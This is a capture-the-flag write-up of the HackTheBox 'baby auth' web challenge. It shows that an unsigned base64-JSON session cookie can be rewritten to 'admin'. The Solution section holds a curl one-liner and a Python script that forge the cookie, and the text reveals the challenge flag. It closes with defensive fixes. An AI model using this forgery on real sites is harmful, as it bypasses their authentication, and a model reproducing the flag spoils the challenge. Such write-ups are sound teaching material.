## Overview

`baby auth` is an Easy HackTheBox **Web** challenge — a tiny PHP login app whose
tagline gives the game away: *"Who needs session integrity these days?"* After you
register and log in, the app hands you a session cookie that is nothing more than
**base64-encoded JSON containing your username**, with no signature, HMAC, or
encryption. Re-encode it as `admin` and the admin view renders the flag. No
credentials, no brute force — just a cookie the server should never have trusted.

## The technique

The app overrides PHP's native opaque session id and stores the user's **identity**
directly in the cookie. Logging in as `hacker` sets:

```
Set-Cookie: PHPSESSID=eyJ1c2VybmFtZSI6ImhhY2tlciJ9
```

That value base64-decodes to readable JSON:

```bash
echo -n 'eyJ1c2VybmFtZSI6ImhhY2tlciJ9' | base64 -d
# {"username":"hacker"}
```

Authorization on `/` is decided straight from this client-held field. Because there
is **no integrity mechanism at all** — nothing binds the cookie to a server secret —
any user can rewrite the username and the server believes it. This is a textbook
[reliance on a cookie without integrity checking](https://cwe.mitre.org/data/definitions/565.html)
([CWE-565](https://cwe.mitre.org/data/definitions/565.html)). It is the simplest
member of the cookie-forgery family: there is no key to recover, just a value to
re-encode.

## Solution

Forge the session cookie as `admin`. Registration is not even required — the cookie
is the only thing the server checks:

```bash
curl -s http://<host>:<port>/ --cookie "PHPSESSID=$(echo -n '{"username":"admin"}' | base64)"
```

The forged cookie is `eyJ1c2VybmFtZSI6ICJhZG1pbiJ9` and the admin dashboard returns
the flag. The full solve script:

```python
#!/usr/bin/env python3
import sys, base64, json, requests, re

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = sys.argv[2] if len(sys.argv) > 2 else "1337"
base = f"http://{host}:{port}"

# The "session" is just base64(JSON) with no integrity check — forge admin directly.
forged = base64.b64encode(json.dumps({"username": "admin"}).encode()).decode()
r = requests.get(base + "/", cookies={"PHPSESSID": forged}, allow_redirects=True)

m = re.search(r"HTB\{[^}]+\}", r.text)
print("FLAG:", m.group(0) if m else "not found")
```

```
FLAG: HTB{...}
```

## Why it worked

"Session integrity" means a piece of state the client cannot reproduce — a random id
keying server-side storage, or a signed/encrypted payload. Here the cookie is plain
attacker-supplied data, so every field in it (username, and by extension the
authorization decision) is rewritable. The flag says it best:
`HTB{s3ss10n_1nt3grity_1s_0v3r4tt3d_4nyw4ys}`.

## Fix / defense

- Use **server-side sessions**: an opaque random id in the cookie keying state stored
  on the server (`session_start()`), so the client never carries its own identity.
- If state must live client-side, **sign it** (encrypt-then-MAC / HMAC-SHA256 over the
  payload with a server secret) and verify before trusting — or use a vetted signed
  cookie / JWT library rather than hand-rolled `base64(JSON)`.
- Never derive an authorization decision from a client-modifiable field without
  integrity verification.
